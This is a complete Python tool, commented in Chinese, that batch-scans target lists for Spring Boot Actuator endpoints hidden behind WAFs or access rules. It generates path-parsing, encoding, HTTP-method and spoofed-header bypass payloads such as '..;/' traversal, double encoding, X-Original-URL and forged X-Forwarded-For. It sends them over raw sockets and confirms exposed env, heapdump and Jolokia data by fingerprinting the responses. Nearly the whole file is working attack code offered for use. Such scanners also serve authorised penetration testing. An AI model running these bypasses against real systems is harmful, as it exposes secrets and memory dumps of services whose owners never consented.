#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
actuator_bypass_scanner.py -- Spring Boot Actuator 变形绕过批量检测器 v1.0

检测范围（对应 7 大类 25+ 手法）:
  A. 路径解析差异 : 分号截断 / 段内分号 / 目录段分号 / ..;/ 穿越 / 双斜杠 / 点段 / 尾斜杠 / 反斜杠
  B. 编码变形     : 单层 URL 编码 / 双重编码 / %2e 与 %2e%2e / %09 控制字符
  C. HTTP 语义    : HEAD 方法(自动 GET 复核) / 超长 URL 填充
  D. 代理网关欺骗 : XFF 伪造 / X-Original-URL / X-Rewrite-URL / X-Forwarded-Host
  E. 版本特性     : Spring Boot 1.x 根路径 / 自定义 base-path 字典 / Jolokia 独立 Servlet / 后缀匹配
  F/G. 防护逻辑缺陷与请求走私 : 属人工验证项(HTTP 层不模拟), 见输出尾部提示

判定引擎（双因子压误报）:
  1) 404 基线比对 -- 每目标先取 404 基线, 与基线同码同长的结果直接丢弃
  2) 特征指纹确认 -- 2xx 且命中 Actuator 响应体特征 -> CONFIRMED
                    2xx 无特征但与基线差异明显      -> SUSPECTED(人工复核)

用法:
  python actuator_bypass_scanner.py -u http://target:8080
  python actuator_bypass_scanner.py -f targets.txt -t 20 --json result.json
  python actuator_bypass_scanner.py -u http://target -v --full

依赖: 纯 Python 标准库(3.8+), 无第三方依赖
说明: 请求层为 raw socket 实现, 完全控制线上字节 ——
      URL 编码/分号/反斜杠等变形原样到达目标, 不受 requests
      unquote_unreserved 之类的客户端 URI 规范化影响;
      默认直连, 不读系统代理环境变量(--proxy 显式指定时除外)
"""

import argparse
import concurrent.futures as cf
import csv
import json
import os
import random
import re
import socket
import ssl
import sys
import threading
import time
import unicodedata
import urllib.parse

VERSION = "1.0"
_tls = threading.local()

UA = "actuator-bypass-scanner/%s" % VERSION

# ============================================================
# 1. 终端输出兼容层（Windows cmd: VT 启用 + ASCII 制表 + 显示宽度对齐）
# ============================================================

def enable_windows_vt():
    """启用 Windows 控制台 ANSI/VT 解析, 失败则自动降级为无色输出"""
    if os.name != "nt":
        return True
    try:
        import ctypes
        k32 = ctypes.windll.kernel32
        h = k32.GetStdHandle(-11)  # STD_OUTPUT_HANDLE
        mode = ctypes.c_uint32()
        if not k32.GetConsoleMode(h, ctypes.byref(mode)):
            return False
        k32.SetConsoleMode(h, mode.value | 0x0004)  # ENABLE_VIRTUAL_TERMINAL_PROCESSING
        return True
    except Exception:
        return False


VT_OK = enable_windows_vt()
USE_COLOR = True


def c(code, s):
    return "\x1b[%sm%s\x1b[0m" % (code, s) if (VT_OK and USE_COLOR) else s


RED, YELLOW, GREY, CYAN, GREEN, BOLD = "31", "33", "90", "36", "32", "1"


ANSI_RE = re.compile(r"\x1b\[[0-9;]*[A-Za-z]")


def strip_ansi(s):
    """剥离 ANSI 转义序列 —— 宽度计算/截断必须基于剥离后的纯文本"""
    return ANSI_RE.sub("", s)


def disp_width(s):
    """显示宽度: 中文等全角字符按 2 列计算(忽略 ANSI 转义序列)"""
    s = strip_ansi(s)
    return sum(2 if unicodedata.east_asian_width(ch) in ("W", "F") else 1 for ch in s)


def trunc_disp(s, w):
    s = strip_ansi(s)  # 防止在转义序列中间截断产生乱码
    out, wid = "", 0
    for ch in s:
        cw = 2 if unicodedata.east_asian_width(ch) in ("W", "F") else 1
        if wid + cw > w - 1:
            return out + "~"
        out += ch
        wid += cw
    return out


def pad_disp(s, w):
    s = trunc_disp(s, w)
    return s + " " * (w - disp_width(s))


# ============================================================
# 2. 检测目标与特征定义
# ============================================================

# 默认探测端点（"" 为 actuator 索引页）
DEFAULT_ENDPOINTS = [
    "", "env", "heapdump", "jolokia/list", "configprops", "mappings",
    "loggers", "beans", "threaddump", "scheduledtasks", "prometheus",
    "gateway/routes", "auditevents", "metrics",
    "trace", "dump",  # 1.x 专属
]

# 变形枚举只对高价值端点做, 控制请求量; --full 时对全部端点变形
VARIANT_ENDPOINTS = ["", "env", "heapdump", "jolokia/list"]

# 常见自定义 base-path（E 类: management.endpoints.web.base-path 改名场景）
BASE_PATHS = ["manage", "management", "monitor", "admin", "ops", "console"]

# 响应体特征指纹: (正则, 描述) —— 仅 2xx 响应参与判定
FEATURE_PATTERNS = [
    (r'"_links"\s*:', "Actuator索引页(_links)"),
    (r'"propertySources"\s*:', "env环境配置"),
    (r'"request"\s*:\s*\{[^{}]*"type"\s*:\s*"list"', "Jolokia-MBean列表"),
    (r'"contexts"\s*:\s*\{', "mappings路由表"),
    (r'"route_id"\s*:', "SpringCloudGateway路由"),
    (r'#\s*(HELP|TYPE)\s', "Prometheus指标"),
    (r'"configuredLevel"\s*:|,\s*"loggers"', "loggers端点"),
    (r'"beans"\s*:\s*\{', "beans容器清单"),
    (r'"threadState"\s*:|"threadName"\s*:', "threaddump"),
    (r'"scheduledtasks"|"cron"\s*:', "定时任务清单"),
]

HEAP_SIGN = (b"JAVA PROFILE", b"\x1f\x8b")  # HPROF 头 / gzip 头


def match_features(status, content):
    feats = []
    if not (200 <= status < 300):
        return feats
    for sig in HEAP_SIGN:
        if content[:12].upper().startswith(sig) or content[:2] == sig:
            feats.append("heapdump二进制(HPROF/gzip)")
            break
    try:
        text = content[:65536].decode("utf-8", "ignore")
    except Exception:
        text = ""
    for pat, desc in FEATURE_PATTERNS:
        if re.search(pat, text) and desc not in feats:
            feats.append(desc)
    return feats


# ============================================================
# 3. 变形 Payload 生成器
# ============================================================

def enc_first_char(seg):
    """段首字符转 %XX 编码: actuator -> %61ctuator"""
    if not seg:
        return seg
    return "%%%02x%s" % (ord(seg[0]), seg[1:])


def variants_for(full_path, pad_size=3000):
    """
    对一个完整路径(如 /actuator/env)生成全部变形。
    返回 [(变形名, 路径, method, headers_dict或None), ...]
    """
    v = []
    add = v.append
    segs = full_path.strip("/").split("/", 1)
    head = "/" + segs[0] if segs else ""
    tail = "/" + segs[1] if len(segs) > 1 else ""
    last_seg = full_path.rsplit("/", 1)

    # ---- A 类: 路径解析差异 ----
    add(("A-分号参数", full_path + ";x=1", "GET", None))
    add(("A-分号参数jsid", full_path + ";jsessionid=x", "GET", None))
    add(("A-空段分号", "/;" + full_path.lstrip("/"), "GET", None))
    if len(segs) > 1:
        add(("A-目录段分号", "%s;/%s" % (head, segs[1]), "GET", None))
    add(("A-穿越..;", "/zzz/..;" + full_path.lstrip("/"), "GET", None))
    add(("A-穿越..", "/zzz/.." + full_path, "GET", None))
    add(("A-双斜杠前缀", "//" + full_path.lstrip("/"), "GET", None))
    add(("A-段内双斜杠", last_seg[0] + "//" + last_seg[1], "GET", None))
    add(("A-点段前缀", "/./" + full_path.lstrip("/"), "GET", None))
    add(("A-段内点段", last_seg[0] + "/./" + last_seg[1], "GET", None))
    add(("A-尾斜杠", full_path + "/", "GET", None))
    add(("A-索引无尾斜杠", full_path.rstrip("/") or "/", "GET", None))
    add(("A-反斜杠", "/\\" + full_path.lstrip("/"), "GET", None))

    # ---- B 类: 编码变形 ----
    enc_parts = [enc_first_char(x) for x in full_path.strip("/").split("/")]
    add(("B-编码首字符", "/" + "/".join(enc_parts), "GET", None))
    add(("B-编码末段", last_seg[0] + "/" + enc_first_char(last_seg[1]), "GET", None))
    add(("B-双重编码点", "/%252e/" + full_path.lstrip("/"), "GET", None))
    add(("B-双重编码dotdot", "/%252e%252e/" + full_path.lstrip("/"), "GET", None))
    add(("B-编码点", "/%2e/" + full_path.lstrip("/"), "GET", None))
    add(("B-编码dotdot", "/%2e%2e/" + full_path.lstrip("/"), "GET", None))
    add(("B-TAB干扰", last_seg[0] + "/%09" + last_seg[1], "GET", None))

    # ---- C 类: HTTP 语义 ----
    add(("C-HEAD方法", full_path, "HEAD", None))
    add(("C-超长URL填充", full_path + "?pad=" + "a" * pad_size, "GET", None))

    # ---- D 类: 代理/网关头欺骗 ----
    add(("D-XFF伪造", full_path, "GET", {"X-Forwarded-For": "127.0.0.1"}))
    add(("D-XFF+RealIP", full_path, "GET",
         {"X-Forwarded-For": "127.0.0.1", "X-Real-IP": "127.0.0.1", "X-Client-IP": "127.0.0.1"}))
    add(("D-X-Original-URL", "/", "GET", {"X-Original-URL": full_path}))
    add(("D-X-Rewrite-URL", "/", "GET", {"X-Rewrite-URL": full_path}))
    add(("D-X-Forwarded-Host", full_path, "GET", {"X-Forwarded-Host": "localhost"}))

    # ---- E 类: 后缀匹配（Spring <2.6 useSuffixPatternMatch）----
    for ext in (".json", ".html", ".ajax"):
        add(("E-后缀" + ext, full_path + ext, "GET", None))

    return v


# ============================================================
# 4. 请求层: 纯标准库 raw socket HTTP 客户端
#    为什么不用 requests: 其 unquote_unreserved 会把 %61 这类
#    unreserved 编码解码后再发, 编码变形在线上失真, 检测无效。
#    raw socket 完全控制线上字节, 变形原样到达目标。
# ============================================================

def parse_proxy(proxy):
    """http://host:port -> (host, port)"""
    sp = urllib.parse.urlsplit(proxy if "://" in proxy else "http://" + proxy)
    return sp.hostname, sp.port or 8080


def connect_target(host, port, timeout):
    return socket.create_connection((host, port), timeout=timeout)


def wrap_tls(sock, host):
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    return ctx.wrap_socket(sock, server_hostname=host)


def read_chunked(sock, buf):
    out = b""
    while True:
        while b"\r\n" not in buf:
            c = sock.recv(65536)
            if not c:
                return out + buf
            buf += c
        line, _, buf = buf.partition(b"\r\n")
        try:
            size = int(line.split(b";")[0].strip(), 16)
        except ValueError:
            return out + buf
        if size == 0:
            return out
        while len(buf) < size:
            c = sock.recv(min(65536, size - len(buf)))
            if not c:
                return out + buf
            buf += c
        out += buf[:size]
        buf = buf[size:]
        while len(buf) < 2:  # 吃掉 chunk 尾 \r\n
            c = sock.recv(65536)
            if not c:
                return out
            buf += c
        buf = buf[2:]


def raw_request(url, method="GET", headers=None, timeout=6, proxy=None):
    """完全按给定 URL 原样发送变形路径; 返回 (status, body_len, body_bytes)"""
    sp = urllib.parse.urlsplit(url)
    scheme = sp.scheme or "http"
    host = sp.hostname or ""
    port = sp.port or (443 if scheme == "https" else 80)
    path = (sp.path or "/") + (("?" + sp.query) if sp.query else "")

    hd = {"Host": sp.netloc, "User-Agent": UA, "Accept": "*/*",
          "Accept-Encoding": "identity", "Connection": "close"}
    if headers:
        hd.update(headers)

    is_https = scheme == "https"
    if proxy:
        p_host, p_port = parse_proxy(proxy)
        sock = connect_target(p_host, p_port, timeout)
        if is_https:
            sock.sendall(("CONNECT %s:%d HTTP/1.1\r\nHost: %s:%d\r\n\r\n"
                          % (host, port, host, port)).encode("latin-1"))
            first = b""
            while b"\r\n\r\n" not in first:
                c = sock.recv(4096)
                if not c:
                    raise IOError("proxy connect failed")
                first += c
            sock = wrap_tls(sock, host)
            req_target = path
        else:
            req_target = scheme + "://" + sp.netloc + path  # 代理 absolute-URI
    elif is_https:
        sock = wrap_tls(connect_target(host, port, timeout), host)
        req_target = path
    else:
        sock = connect_target(host, port, timeout)
        req_target = path

    try:
        req = "%s %s HTTP/1.1\r\n%s\r\n" % (
            method.upper(), req_target, "".join("%s: %s\r\n" % kv for kv in hd.items()))
        sock.sendall(req.encode("latin-1", "replace"))

        buf = b""
        while b"\r\n\r\n" not in buf:
            c = sock.recv(8192)
            if not c:
                break
            buf += c
        head, _, body = buf.partition(b"\r\n\r\n")
        lines = head.split(b"\r\n")
        try:
            status = int(lines[0].decode("latin-1", "ignore").split()[1])
        except (IndexError, ValueError):
            status = 0
        hmap = {}
        for ln in lines[1:]:
            if b":" in ln:
                k, v = ln.split(b":", 1)
                hmap[k.strip().lower().decode("latin-1", "ignore")] = v.strip().decode("latin-1", "ignore")

        if method.upper() == "HEAD":  # HEAD 无响应体
            return status, 0, b""

        te = hmap.get("transfer-encoding", "").lower()
        cl = hmap.get("content-length")
        if "chunked" in te:
            body = read_chunked(sock, body)
        elif cl and cl.isdigit():
            need = int(cl) - len(body)
            while need > 0:
                c = sock.recv(min(65536, need))
                if not c:
                    break
                body += c
                need -= len(c)
        else:  # connection-close 兜底
            sock.settimeout(timeout)
            while True:
                try:
                    c = sock.recv(65536)
                except (socket.timeout, OSError):
                    break
                if not c:
                    break
                body += c
    finally:
        try:
            sock.close()
        except Exception:
            pass
    return status, len(body), body


def fetch(url, method="GET", headers=None, timeout=6, proxy=None):
    try:
        return raw_request(url, method, headers, timeout, proxy)
    except Exception:
        return 0, 0, b""


# ============================================================
# 5. 判定引擎
# ============================================================

def same_baseline(status, ln, bs, bl):
    """状态码与基准一致且长度接近 -> 视为与基准页相同"""
    if status != bs:
        return False
    return abs(ln - bl) <= max(50, int(bl * 0.3))


def judge(status, ln, content, bs, bl):
    """五级判定: CONFIRMED绕过 / SUSPECTED疑似 / BLOCKED被拦截 / NO_BYPASS未绕过 / SKIP失败"""
    if status == 0:
        return "SKIP", [], "连接失败/超时"
    feats = match_features(status, content)
    if feats:
        return "CONFIRMED", feats, "绕过成功,已命中特征"
    if same_baseline(status, ln, bs, bl):
        return "NO_BYPASS", [], "响应与基准页一致,该变形未绕过"
    if status in (401, 403):
        return "BLOCKED", [], "被WAF/ACL拦截(拦截页与基准不同)"
    if 300 <= status < 400:
        return "SKIP", [], "重定向(未跟随)"
    if 200 <= status < 300:
        return "SUSPECTED", [], "2xx但无Actuator特征,需人工复核"
    return "NO_BYPASS", [], "HTTP %d 应用层拒绝" % status


# ============================================================
# 6. 单目标扫描
# ============================================================

CATEGORY_ORDER = ["原始路径", "A-路径解析差异", "B-编码变形", "C-HTTP语义",
                  "D-网关头欺骗", "E-版本特性"]
CAT_OF = {"A": "A-路径解析差异", "B": "B-编码变形", "C": "C-HTTP语义",
          "D": "D-网关头欺骗", "E": "E-版本特性"}


def payload_desc(rel_path, method, headers):
    """组装可读 payload 描述: 方法 + 完整路径 + 附加头"""
    parts = [] if method == "GET" else ["%s " % method]
    q = rel_path.split("?", 1)
    p = q[0]
    if len(q) == 2 and q[1].startswith("pad=") and len(q[1]) > 24:
        p += "?pad=<a*%d>" % len(q[1][4:])
    elif len(q) == 2:
        p += "?" + q[1]
    parts.append(p)
    if headers:
        parts.append("  +H[" + "; ".join("%s:%s" % kv for kv in headers.items()) + "]")
    return "".join(parts)


def scan_target(target, args):
    base = target.rstrip("/")
    if "://" not in base:
        base = "http://" + base
    rnd = "n0exist%d" % random.randint(10000, 99999)
    pad = args.pad_size

    # ---- 基准响应(任意不存在路径) ----
    b404_s, b404_l, _ = fetch("%s/%s" % (base, rnd), timeout=args.timeout, proxy=args.proxy)
    b2_s, b2_l, _ = fetch("%s/actuator/%s" % (base, rnd), timeout=args.timeout, proxy=args.proxy)
    bs = b404_s if b404_s else 404
    bl = b404_l

    # ---- 候选 payload: (变形名, url, method, headers, 类别, 相对路径) ----
    candidates = []
    endpoints = DEFAULT_ENDPOINTS if args.full or not args.endpoints else args.endpoints

    # 第一阶段: 原始路径（1.x 根路径 + 2.x /actuator 前缀 双路扫描）
    for ep in endpoints:
        if ep:
            candidates.append(("原始1x:/%s" % ep, "%s/%s" % (base, ep), "GET", None,
                               "原始路径", "/%s" % ep))
            candidates.append(("原始2x:/actuator/%s" % ep, "%s/actuator/%s" % (base, ep), "GET", None,
                               "原始路径", "/actuator/%s" % ep))
        else:
            candidates.append(("原始2x:/actuator", "%s/actuator" % base, "GET", None,
                               "原始路径", "/actuator"))

    # E 类: 自定义 base-path 字典
    for bp in BASE_PATHS:
        for ep in ("actuator", "env", "heapdump", "jolokia/list"):
            candidates.append(("E-前缀/%s/%s" % (bp, ep), "%s/%s/%s" % (base, bp, ep), "GET", None,
                               "E-版本特性", "/%s/%s" % (bp, ep)))

    # 第二阶段: 变形枚举（默认只对高价值三件套+索引, --full 全端点）
    v_endpoints = VARIANT_ENDPOINTS if not args.full else [e for e in endpoints if e]
    for ep in v_endpoints:
        p = "/actuator/" + ep if ep else "/actuator"
        for name, vp, m, h in variants_for(p, pad):
            candidates.append(("%s:actuator%s" % (name, p[9:] or ""), "%s%s" % (base, vp), m, h,
                               CAT_OF.get(name[0], "其他"), vp))
        if ep:  # 1.x 根路径也做一遍变形
            p1 = "/" + ep
            for name, vp, m, h in variants_for(p1, pad):
                candidates.append(("%s:1x%s" % (name, p1), "%s%s" % (base, vp), m, h,
                                   CAT_OF.get(name[0], "其他"), vp))

    # ---- 并发执行 ----
    results = []
    with cf.ThreadPoolExecutor(max_workers=max(2, args.threads)) as pool:
        futs = {pool.submit(fetch, u, m, h, args.timeout, args.proxy): (n, u, m, h, cat, pth)
                for n, u, m, h, cat, pth in candidates}
        for fut in cf.as_completed(futs):
            n, u, m, h, cat, pth = futs[fut]
            st, ln, content = fut.result()
            # HEAD 命中 2xx 时自动用 GET 复核
            if m == "HEAD" and 200 <= st < 300:
                st, ln, content = fetch(u, "GET", None, args.timeout, args.proxy)
                n = n + "(GET复核)"
            results.append({"variant": n, "url": u, "method": m,
                            "status": st, "len": ln, "content": content,
                            "cat": cat, "payload": payload_desc(pth, m, h),
                            "verdict": "", "features": [], "note": ""})

    # ---- 判定 ----
    for r in results:
        verdict, feats, note = judge(r["status"], r["len"], r["content"], bs, bl)
        r["verdict"], r["features"], r["note"] = verdict, feats, note
        del r["content"]  # 释放内存, 报告输出不需要保留响应体

    return {"target": base, "baseline": {"status": bs, "len": bl,
                                         "actuator_prefix_status": b2_s},
            "results": results,
            "summary": summarize(results)}


def summarize(results):
    cnt = {"CONFIRMED": 0, "SUSPECTED": 0, "BLOCKED": 0, "NO_BYPASS": 0, "SKIP": 0}
    for r in results:
        cnt[r["verdict"]] = cnt.get(r["verdict"], 0) + 1
    return cnt


# ============================================================
# 7. 报告输出
# ============================================================

VERDICT_ORDER = {"CONFIRMED": 0, "SUSPECTED": 1, "BLOCKED": 2, "NO_BYPASS": 3, "SKIP": 4}
VERDICT_TAG = {
    "CONFIRMED": ("RED", "[+]绕过成功"),
    "SUSPECTED": ("YELLOW", "[?]疑似"),
    "BLOCKED": ("YELLOW", "[x]被拦截"),
    "NO_BYPASS": ("GREY", "[-]未绕过"),
    "SKIP": ("GREY", "(失败)"),
}


def verdict_cell(v, w=12):
    """先对齐纯文本, 再上色 —— ANSI 包裹住已对齐的文本, 转义序列不占显示宽度"""
    color, tag = VERDICT_TAG[v]
    return c({"RED": RED, "YELLOW": YELLOW, "GREY": GREY}[color], pad_disp(tag, w))


def print_report(reports, verbose=False, brief=False):
    total_c, total_s = 0, 0
    for rep in reports:
        s = rep["summary"]
        total_c += s.get("CONFIRMED", 0)
        total_s += s.get("SUSPECTED", 0)
        print("")
        print(c(CYAN, "=" * 110))
        print(c(CYAN, " 目标: ") + c(BOLD, rep["target"]))
        print(c(CYAN, "=" * 110))
        print(" 基准响应: HTTP %s (len=%s) | /actuator前缀基准: HTTP %s"
              % (rep["baseline"]["status"], rep["baseline"]["len"],
                 rep["baseline"]["actuator_prefix_status"]))
        if rep["baseline"]["status"] in (401, 403):
            print(c(YELLOW,
                    " [!] 基准情报: 任意不存在路径均返回 HTTP %s —— WAF/ACL 疑似对全站统一拦截," % rep["baseline"]["status"]
                    + "下表中'未绕过'即表示该变形被同一拦截页吞掉"))
        print(" 说明: HEAD 探测命中 2xx 时会自动用 GET 复核, 不会产生误报; 结论五级:")
        print("       [+]绕过成功  [?]疑似  [x]被拦截(与基准页不同)  [-]未绕过(与基准页一致)  (失败)")
        print(c(GREY, "-" * 110))
        print(" %s  %s  %s  %s  %s" % (
            pad_disp("状态", 5), pad_disp("方法", 5), pad_disp("结论", 12),
            pad_disp("尝试的Payload", 52), trunc_disp("特征/说明", 40)))
        print(c(GREY, "-" * 110))

        # 按类别分组输出
        by_cat = {}
        for r in rep["results"]:
            by_cat.setdefault(r.get("cat", "其他"), []).append(r)
        cats = [c0 for c0 in CATEGORY_ORDER if c0 in by_cat] + \
               [c0 for c0 in by_cat if c0 not in CATEGORY_ORDER]
        for cat in cats:
            rows = sorted(by_cat[cat], key=lambda x: (VERDICT_ORDER.get(x["verdict"], 9), x["variant"]))
            cnt = {"CONFIRMED": 0, "SUSPECTED": 0, "BLOCKED": 0, "NO_BYPASS": 0, "SKIP": 0}
            for r in rows:
                cnt[r["verdict"]] = cnt.get(r["verdict"], 0) + 1
            print(c(BOLD, " [%s] 尝试%d条: " % (cat, len(rows)))
                  + " ".join("%s%d" % (k, cnt[k]) for k in ("CONFIRMED", "SUSPECTED", "BLOCKED", "NO_BYPASS", "SKIP")))
            for r in rows:
                if brief and r["verdict"] in ("NO_BYPASS", "SKIP"):
                    continue
                feats = " | ".join(r["features"]) if r["features"] else r["note"]
                print(" %s  %s  %s  %s  %s" % (
                    pad_disp(str(r["status"] or "-"), 5),
                    pad_disp(r["method"], 5),
                    verdict_cell(r["verdict"], 12),
                    pad_disp(r["payload"], 52),
                    trunc_disp(feats, 40)))
            print(c(GREY, "-" * 110))
        print(" 小计: " + c(RED, "绕过 %d" % s.get("CONFIRMED", 0)) + " | "
              + c(YELLOW, "疑似 %d" % s.get("SUSPECTED", 0)) + " | "
              + c(YELLOW, "拦截 %d" % s.get("BLOCKED", 0)) + " | "
              + "未绕过 %d | 失败 %d" % (s.get("NO_BYPASS", 0), s.get("SKIP", 0)))

    print("")
    print(c(CYAN, "=" * 110))
    print(" 总计: " + c(RED, "CONFIRMED %d" % total_c) + "  " + c(YELLOW, "SUSPECTED %d" % total_s))
    print(c(CYAN, "-" * 110))
    print(" 人工复核项(脚本不覆盖):")
    print("  1) 请求走私(CLB/stgw 与后端 CL/TE 优先级差异) -- 用 smuggler 工具单测")
    print("  2) Nginx off-by-slash(location /api { proxy_pass http://up/; }) -- 对照网关配置")
    print("  3) 管理端口独立( management.port ) -- 需 SSRF/内网可达性配合")
    print(c(CYAN, "=" * 110))


def dump_json(path, reports):
    data = {"scan_time": time.strftime("%Y-%m-%d %H:%M:%S"),
            "tool": "actuator_bypass_scanner v%s" % VERSION, "targets": reports}
    with open(path, "w", encoding="utf-8") as f:
        json.dump(data, f, ensure_ascii=False, indent=2)


def dump_csv(path, reports):
    with open(path, "w", newline="", encoding="utf-8-sig") as f:
        w = csv.writer(f)
        w.writerow(["target", "category", "variant", "payload", "method",
                    "status", "verdict", "features"])
        for rep in reports:
            for r in rep["results"]:
                w.writerow([rep["target"], r.get("cat", ""), r["variant"], r["payload"],
                            r["method"], r["status"], r["verdict"], " | ".join(r["features"])])


# ============================================================
# 8. 入口
# ============================================================

def load_targets(args):
    ts = []
    if args.url:
        ts.append(args.url)
    if args.file:
        with open(args.file, encoding="utf-8") as f:
            ts += [x.strip() for x in f if x.strip() and not x.startswith("#")]
    return ts


def main():
    global USE_COLOR
    ap = argparse.ArgumentParser(
        description="Spring Boot Actuator 变形绕过批量检测器",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="示例:\n  python %(prog)s -u http://target:8080\n"
               "  python %(prog)s -f targets.txt -t 20 --json result.json\n"
               "  python %(prog)s -u http://target -v --full")
    ap.add_argument("-u", "--url", help="单目标 URL")
    ap.add_argument("-f", "--file", help="目标列表文件(每行一个)")
    ap.add_argument("-t", "--threads", type=int, default=10, help="并发线程数(默认10)")
    ap.add_argument("--timeout", type=int, default=6, help="单请求超时秒(默认6)")
    ap.add_argument("--proxy", default=None, help="显式指定代理, 如 http://127.0.0.1:8080 (默认不走任何代理)")
    ap.add_argument("--full", action="store_true", help="对全部端点做变形枚举(请求量约为默认4-5倍)")
    ap.add_argument("--endpoints", nargs="*", default=None, help="自定义端点列表, 如 --endpoints env heapdump")
    ap.add_argument("--pad-size", type=int, default=3000, help="超长URL填充字节数(默认3000)")
    ap.add_argument("--json", dest="json_path", help="JSON 结果输出路径")
    ap.add_argument("--csv", dest="csv_path", help="CSV 结果输出路径")
    ap.add_argument("--no-color", action="store_true", help="关闭彩色输出")
    ap.add_argument("--brief", action="store_true", help="只显示绕过/疑似/拦截行, 隐藏'未绕过'行(默认全量显示每条payload)")
    ap.add_argument("-v", "--verbose", action="store_true", help="显示全部请求(含失败)")
    args = ap.parse_args()

    if not args.url and not args.file:
        ap.error("必须提供 -u 或 -f")
    if args.no_color or not VT_OK:
        USE_COLOR = False

    targets = load_targets(args)
    print(c(CYAN, "=" * 78))
    print(c(CYAN, " Actuator 变形绕过扫描器 v%s" % VERSION))
    print(" 目标数: %d | 并发: %d | 超时: %ss | 代理: %s | 模式: %s"
          % (len(targets), args.threads, args.timeout, args.proxy or "直连(trust_env=off)",
             "FULL" if args.full else "标准"))
    print(c(CYAN, "=" * 78))

    reports = []
    for i, t in enumerate(targets, 1):
        try:
            rep = scan_target(t, args)
        except Exception as e:
            rep = {"target": t, "baseline": {"status": 0, "len": 0, "actuator_prefix_status": 0},
                   "results": [], "summary": {}, "error": str(e)}
            print(" [%d/%d] %s 扫描异常: %s" % (i, len(targets), t, e))
            continue
        reports.append(rep)

    print_report(reports, args.verbose, args.brief)

    if args.json_path:
        dump_json(args.json_path, reports)
        print(" JSON 已写入: %s" % args.json_path)
    if args.csv_path:
        dump_csv(args.csv_path, reports)
        print(" CSV 已写入: %s" % args.csv_path)


if __name__ == "__main__":
    main()
